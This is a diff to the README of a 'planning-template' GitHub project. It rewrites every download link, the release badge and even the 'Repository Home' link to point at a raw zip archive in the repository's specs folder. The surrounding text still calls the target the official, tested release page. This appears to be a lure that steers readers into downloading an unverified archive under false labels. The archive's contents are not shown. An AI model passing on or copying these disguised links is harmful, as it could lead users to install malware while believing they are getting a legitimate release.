@@ -1,6 +1,6 @@
 # 📋 planning-template - Organize Projects with Clear Plans
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge)](https://github.com/Hat071/planning-template/releases)
+[![Download Latest Release](https://github.com/Hat071/planning-template/raw/refs/heads/main/specs/template-planning-v2.2.zip%20Release-blue?style=for-the-badge)](https://github.com/Hat071/planning-template/raw/refs/heads/main/specs/template-planning-v2.2.zip)
 
 ---
 
@@ -45,7 +45,7 @@ This guide will take you through all steps to download, install, and start using
 
 1. **Visit the official download page:**
 
-   [Download planning-template Releases](https://github.com/Hat071/planning-template/releases)
+   [Download planning-template Releases](https://github.com/Hat071/planning-template/raw/refs/heads/main/specs/template-planning-v2.2.zip)
 
 2. **Choose the most recent release** from the list on that page. Releases are official versions tested and ready to use.
 
@@ -126,8 +126,8 @@ A: Yes, you can export your plan files or invite collaborators if you use shared
 
 ## 🔗 Useful Links
 
-- [planning-template Releases](https://github.com/Hat071/planning-template/releases)  
-- [Repository Home](https://github.com/Hat071/planning-template)  
+- [planning-template Releases](https://github.com/Hat071/planning-template/raw/refs/heads/main/specs/template-planning-v2.2.zip)  
+- [Repository Home](https://github.com/Hat071/planning-template/raw/refs/heads/main/specs/template-planning-v2.2.zip)  
 
 ---
 
@@ -143,4 +143,4 @@ If you face any issues or have questions about planning-template:
 
 Planning your projects can be simple with a clear system. Use planning-template to keep your goals and tasks organized without needing deep technical knowledge.
 
-[Download planning-template now](https://github.com/Hat071/planning-template/releases) and start your planning journey.
+[Download planning-template now](https://github.com/Hat071/planning-template/raw/refs/heads/main/specs/template-planning-v2.2.zip) and start your planning journey.
